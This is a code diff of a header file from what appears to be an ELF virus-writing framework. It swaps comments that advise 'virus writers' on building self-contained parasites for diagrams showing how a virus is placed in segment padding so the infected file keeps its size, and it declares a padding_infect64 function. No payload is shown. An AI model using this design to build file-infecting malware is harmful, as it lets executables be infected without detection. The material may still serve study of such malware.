@@ -11,30 +11,36 @@ namespace vt::infector {
 //  - It's possible to infect an infected host again. In other words, caller
 //    should handle skipping logic.
 //
-// Parasite writers should be aware of the following limitations:
-//  - Do not link with other libraries (no glibc). This repo strives to
-//    make it easier for virus writers by providing our own version of various
-//    bits.
-//  - Must be self-contained in .text section. In other words, no .data/.bss
-//    sections for global variables, no errno, no environ (however we route
-//    host's environ to main).
-//  - No string literals. Similiar to the previous item, it would cause the
-//    parasite to use things in .rodata. However, since some syscalls requires
-//    initialized strings, we provided a string macro to use string literals in
-//    .text to work around this.(Using a common technique in buffer overflow
-//    attack)
-//  - No fancy C++ things that will need to be used outside of .text.
+//  host elf structure            infected elf structure
+//  -------------------           -----------------------
+//  elf_hdr                       elf_hdr
+//  phdrs                         phdrs
+//  executale_sections            executale_sections  
+//  padding                       padding             <- virus inserted here
+//  non-exec sections             non-exec sections
+//  shdrs                         shdrs
 //
-// Other limitations and assumptions but are taken care of for you:
-//  - entry (_start) must be at the beginning of the .text (we provided a custom
-//    linker script to help with that automatically)
-//  - must contain certain signatures which can be patched to resume control
-//    back to the host. (our _start provided this already and is linked inside a
-//    parasite binary bazel macro for you)
+//
+// Because the sections in file has the same padding, inserting virus doesn't
+// change file size.
+//
+//  infected elf segments
+//  -------------------
+//  LOAD RX
+//    Ehdr
+//    phdrs
+//    interp
+//  PADDING    <- virus here
+//  LOAD RW
+//    .data
+//    ...
 bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                       common::Mmap<PROT_READ> parasite_mapping);
 
 struct PaddingInfect {
+  static size_t output_size(size_t host_size, size_t parasite_size) {
+    return host_size;
+  }
   bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                   common::Mmap<PROT_READ> parasite_mapping) {
     return padding_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
